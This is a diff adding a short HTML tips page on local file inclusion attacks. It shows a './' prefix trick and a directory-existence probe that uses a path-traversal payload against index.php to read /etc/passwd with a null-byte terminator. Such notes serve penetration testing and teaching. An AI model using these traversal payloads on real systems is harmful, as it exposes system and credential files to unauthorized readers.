@@ -1,0 +1,11 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Extra tips/tricks</title>
+</head><body>“./” before the page name<br/>
+example: index.php?page=news.php &gt;&gt; index.php?page=./news.php if it works, but it won’t always work<br/>
+<br/>
+The “Does a folder exist” trick.<br/>
+If you got a LFI, a good technique to know if a folder exist is simply to enter, then go out of it. <br/>
+Example: index.php?page=../../../../../../var/www/dossierexistant/../../../../../etc/passwd%00</body></html>
